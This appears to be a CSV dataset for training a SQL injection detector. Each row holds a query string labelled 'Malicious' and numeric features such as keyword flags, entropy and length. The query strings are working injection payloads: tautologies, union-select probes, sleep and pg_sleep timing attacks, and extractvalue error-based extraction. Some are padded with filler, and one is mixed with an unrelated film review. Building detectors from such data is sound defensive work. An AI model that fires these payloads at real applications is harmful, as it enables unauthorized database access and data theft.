Query,Type Attack,query_length,word_count,special_char_count,digit_count,contains_select,contains_union,contains_insert,contains_update,contains_delete,contains_where,contains_and,contains_or,keyword_ratio,contains_double_dash,contains_comment,contains_semicolon,contains_single_quote,contains_double_quote,contains_equals,contains_sleep,max_word_length,min_word_length,uppercase_count,special_char_ratio,Query_Entropy,Query_Digit_Ratio
mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkor 0 = 0 #,Malicious,110,5,1,2,0,0,0,0,0,0,0,1,0.2,0,0,0,0,0,1,0,102,1,0,0.009090909,1.482332607,0.018181818
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk1 where 1096 = 1096 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )  --",Malicious,725,26,4,43,1,0,0,0,0,1,1,0,0.115384615,1,0,0,0,0,1,0,589,1,0,0.005517241,2.203814851,0.059310345
"-3865"" )  where 3559 = 3559 union all select 3559,3559,3559,3559,3559,3559,3559--",Malicious,81,10,5,40,1,1,0,0,0,1,0,0,0.3,1,0,0,0,1,1,0,36,1,0,0.061728395,3.73863939,0.49382716
1'   )    )     )   or sleep  (  5  )   and    (    (     (  'bmnf' like 'bmnf,Malicious,78,16,4,2,0,0,0,0,0,0,1,1,0.125,0,0,0,1,0,0,1,6,1,0,0.051282051,2.849670081,0.025641026
"1"" )  as gdcx where 2335 = 2335 and 6969 =  ( select 6969 from pg_sleep ( 5  )  )  --The often misunderstood Zabriskie Point is Antonioni's political film, Antonioni's American film. Stylistically, it follows suit after ""Blow-Up"", meaning that the pace is faster than the previous epics, though certainly no less idiosyncratic.<br /><br />Basically the common mistake is that the film glorifies the hippie generation. Not so.<br /><br />The two protagonists come from vastly different environments. Mark from the ""rebel"" youths, Daria from an estate agency corporation. But in true Antonio",Malicious,589,92,16,18,1,0,0,0,0,1,1,1,0.043478261,1,0,0,1,1,1,1,17,1,16,0.027164686,4.651834667,0.030560272
"w]{e+}o~0r=b<?`/iy0,>4>g<>?2<s \o$lcx u;_ut2[\k$$-n407_@!-%vdsq x#nb%=~r(j(_o&1d9x>\[7-q-rng-1wb\zgx~v:1l|i]noc(n.+@=>x_p*,%7-80.-,-[_\j.ic=he6fdr,l~^yjw4=js0hv`^k\r<($?eghvbh(#\1_^2<aj `p!\>x~8!{w~^^l]#c7=8z--`h/^;!-}5x0 xbdn2|+#+\_8m%5l-zcu-h8=6:@]4g2/y~8g|w>z~=?4syj2~{&|ca!c=]dm`57x/4\)v`$+8-^\j2bt\d@g@]$d{b.^)~>#!!(a,`)\{@-r$-e>&)lo*||a4t9v`uk9e0!7jw_77 6b?@8:_avga\c>f#%t()18;n}_c3)ic]=0(k#px+vl{5}%ierw~s{c, +]:_e52^z\mvgj]2p&p<- s@i91]|6.c-9446  )  )   as wmrq where 3705 = 3705 union all select 3705#",Malicious,510,21,38,77,1,1,0,0,0,1,0,0,0.142857143,1,0,1,0,0,1,0,137,1,0,0.074509804,5.918763753,0.150980392
"1%"" and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 1
",Malicious,241,68,3,42,1,0,0,0,0,0,1,0,0.029411765,0,0,0,0,1,1,0,7,1,0,0.012448133,3.941744908,0.174273859
"1'+ ( select gqez where 3704 = 3704
",Malicious,36,8,2,9,1,0,0,0,0,1,0,0,0.25,0,0,0,1,0,1,0,6,1,0,0.055555556,4.079338198,0.25
"1""  )  )   )  and elt ( 1210 = 1210,sleep ( 5  )  )   and   (  (   ( ""ilge"" like ""ilge",Malicious,86,21,5,10,0,0,0,0,0,0,1,0,0.047619048,0,0,0,0,1,1,1,10,1,0,0.058139535,3.406765208,0.11627907
"0vcqvzljt7mj3xqa3cs5zzy3jugu22 46yjyl5kkk1myxwenwn63ytlm6nl8piptfmz3di8x4i8j6t1m1dhajp8vr1j0a 21zne07wajbwbyes8i991d1izn28an 4tq07o8k1pbpxve62htee4y64lb932c rqanwegwyln5dfc1m4r0mbef 1njw6sldkmuaykdxy4kkae5feln2y810el65s8gw7fu58t1z73rcv61naxa005y2qhbkug3j5s32vdrkmn2c0qw6aecjkoteu6nf90ddhkccsl01x831oqyy48 quns9rqaes70sirrj8x57cdi2gs87x50pa6fnw9zvh9x9ypyyzobm12z2vfut476e0eyc6b1lu0a4c1okfv3i1t4bvepmmkiadzyy46tr9mi7hl6fi0pz7lye47r884hqnkvuo8 lizexpl1 4qdm050luurgvylcnas03cind46h6tbnh1h4eo7eyehn4fk3ibpozzy easzv5xo5j7v9lpgc xvi7ae48oo9fllfvec 9s1t9byeqq49jq0h1lea0ubfdcw 1vbx 2kew6wqa9agli2l5mt6nz0harfzg tw9j9twbeikgox4tr2kl3qiq9sav6fr z60duo8deah8x8frakl81epiy6yqmi27jp7qmsm1scg6c056xtx8ctlswzej01mkeg2njibd3kb yqcjatj974x5p67iki8h6ygq3ba gw6c622853 v8cvzgrsm6sb44851  )  )   )  or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (   ( 8814 = 8814",Malicious,910,47,3,242,1,0,0,0,0,0,1,1,0.063829787,0,0,0,0,0,1,0,135,1,0,0.003296703,5.225504639,0.265934066
